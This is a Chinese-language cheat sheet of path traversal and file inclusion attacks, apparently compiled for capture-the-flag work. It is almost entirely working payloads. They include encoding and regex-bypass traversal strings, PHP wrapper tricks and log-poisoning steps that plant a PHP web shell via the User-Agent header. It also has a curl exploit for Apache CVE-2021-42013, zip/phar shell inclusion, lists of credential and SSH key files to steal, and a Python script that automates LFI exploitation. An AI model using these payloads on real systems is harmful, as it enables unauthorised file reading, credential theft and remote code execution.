# 文件包含/路径遍历 - 攻击库
**Keywords**: LFI, Local File Inclusion, Path Traversal, Directory Traversal, File Inclusion, RFI, Remote File Inclusion, File Read

## 基础路径遍历Payload

### 目录遍历
```
../../../etc/passwd
..\..\..\..\windows\system32\config\sam
....//....//....//etc/passwd
..;/..;/..;/etc/passwd
```

### 编码绕过
```
%2e%2e%2fetc%2fpasswd
..%252f..%252fetc%252fpasswd (双编码)
%252e%252e%252fetc%252fpasswd
..%c0%af..%c0%afetc%c0%afpasswd (Unicode)
```

### Null字节
```
../../../etc/passwd%00
../../etc/passwd%00.txt
```

### 点号变体
```
....//....//....//etc/passwd  # 被解析为../../..但正则检查不到
....\....\....\windows\system32\config\sam
```

## LFI/文件包含Payload

### PHP常用文件
```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/mysql/my.cnf
/root/.ssh/id_rsa
/home/user/.ssh/id_rsa
/var/www/html/config.php
/var/www/html/database.yml
```

### PHP Wrapper协议
```
php://filter/read=convert.base64-encode/resource=/etc/passwd
php://filter/read=string.rot13/resource=/etc/passwd
php://input
php://data:text/plain,<?php system('id');?>
file:///etc/passwd
```

### 日志文件包含
```
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/auth.log
/var/log/mail.log
```

### 日志中注入RCE
```bash
# 在User-Agent中注入PHP代码
curl -H "User-Agent: <?php system('id'); ?>" "http://target/"

# 访问日志文件进行RCE
http://target/index.php?page=/var/log/apache2/access.log
```

## 实际案例提取

### 案例019: 直接路径遍历
```bash
# 基础遍历
curl "http://target:5000/resource?filename=../flag.txt"
curl "http://target:5000/resource?filename=../../flag.txt"
curl "http://target:5000/resource?filename=../../../flag.txt"

# 尝试不同路径
curl "http://target:5000/resource?filename=../../../../etc/passwd"
curl "http://target:5000/resource?filename=../../../../var/www/html/flag"
```

### 案例022: SSTI Include路径遍历
```bash
# 通过SSTI的include功能进行路径遍历
curl -b cookies.txt "http://target:5000/error?error_type=../../../../../flag.txt"
curl -b cookies.txt "http://target:5000/error?error_type=../../../../../etc/passwd"
```

### 案例026: Apache 2.4.50 CVE-2021-42013
```bash
# CVE-2021-42013路径遍历
curl "http://target/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/FLAG.txt"
curl "http://target/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# 双编码
curl "http://target/cgi-bin/%252e%252e/%252e%252e/%252e%252e/FLAG.txt"

# 其他编码
curl "http://target/cgi-bin/..%2f..%2f..%2f..%2fFLAG.txt"
```

### 案例028: PHP LFI双点号绕过
```bash
# 过滤检查: preg_match('/\.\./', $file)
# 绕过: ....// 被解析为 ../ 但正则检查不到

curl "http://target:80/post.php?id=....//....//....//FLAG.txt"

# 组合使用
curl "http://target:80/post.php?id=....\\....\\....\\FLAG.txt"  # Windows风格

# 原理：
# ....// -> ../ (一对点号被移除)
# ....// -> ../ (再移除一对)
# 结果: ../../../ 完成路径遍历但绕过正则
```

## 日志投毒RCE

```bash
# 步骤1: 在User-Agent中注入PHP代码
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" "http://target/"

# 步骤2: 访问Apache日志文件进行RCE
curl "http://target/index.php?page=/var/log/apache2/access.log&cmd=id"

# 步骤3: 读取flag
curl "http://target/index.php?page=/var/log/apache2/access.log&cmd=cat%20/flag.txt"

# Nginx版本
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" "http://target/"
curl "http://target/index.php?page=/var/log/nginx/access.log&cmd=id"
```

## Zip/Phar内存破坏

```bash
# 创建包含PHP的zip包
zip shell.zip shell.php

# 访问zip内部文件
http://target/index.php?page=zip://shell.zip%23shell.php

# Phar协议
http://target/index.php?page=phar://shell.phar/shell.php
```

## 快速识别

1. **寻找include/require参数**
   - `?page=`, `?file=`, `?id=`, `?include=`

2. **测试路径遍历**
   ```bash
   # 尝试访问已知文件
   http://target?page=../../../etc/passwd
   http://target?file=....//....//....//flag
   ```

3. **检查错误信息**
   - 通常会显示包含的文件路径

4. **尝试多种协议**
   - file://, php://, data://, expect://

5. **检查日志文件位置**
   - Linux: /var/log/*, /home/*/.ssh/
   - Windows: C:\Windows\*, C:\Users\*

## Payload优先级

1. 基础遍历: `../../../`
2. 编码绕过: `%2e%2e%2f`
3. 特殊技巧: `....//`, 双编码
4. 协议尝试: `php://`, `file://`
5. 日志投毒: 通过日志进行RCE

## 常见目标文件

```
# 配置文件
/etc/passwd, /etc/shadow, /etc/hosts
/var/www/html/config.php, /var/www/html/web.config
/app/settings.py, /app/config.yaml

# SSH密钥
~/.ssh/id_rsa, ~/.ssh/authorized_keys

# 历史文件
~/.bash_history, ~/.mysql_history, ~/.zsh_history

# Flag位置
/flag.txt, /FLAG.txt, /opt/flag.txt, /root/flag.txt
```


## 场景补充

### 场景1: 基础LFI读取敏感文件
```bash
curl "http://target/view?file=../../../etc/passwd"
curl "http://target/download?path=../../../../flag.txt"
curl "http://target/include?page=../../config.php"
```

### 场景2: PHP Wrapper读取源码
```bash
# Base64编码读取
curl "http://target/view?file=php://filter/convert.base64-encode/resource=/etc/passwd"
curl "http://target/view?file=php://filter/read=convert.base64-encode/resource=config.php"

# 直接读取
curl "http://target/view?file=php://input" -d "<?php system('id'); ?>"
```

### 场景3: 日志投毒RCE
```bash
# 步骤1: 在User-Agent中注入PHP代码
curl -A "<?php system(\$_GET['cmd']); ?>" "http://target/"

# 步骤2: 包含日志文件
curl "http://target/view?file=../../../../var/log/apache2/access.log&cmd=cat /flag.txt"
curl "http://target/view?file=../../../../var/log/nginx/access.log&cmd=id"
```

### 场景4: Apache CVE-2021-42013路径遍历
```bash
curl "http://target/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
curl "http://target/cgi-bin/.%2e/%2e%2e/%2e%2e/FLAG.txt"
curl "http://target/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/flag"
```

### Python自动化LFI利用
```python
def exploit_lfi(target, param='file'):
    files = ['/etc/passwd', '/flag', '/flag.txt', '/app/flag.txt', 
             '/var/www/html/config.php', '/proc/self/environ']
    
    for f in files:
        # 尝试多层目录遍历
        for depth in range(1, 10):
            payload = '../' * depth + f.lstrip('/')
            r = requests.get(f"{target}/view", params={param: payload})
            if r.status_code == 200 and len(r.text) > 50:
                print(f"[+] 找到文件: {payload}")
                print(r.text[:200])
```
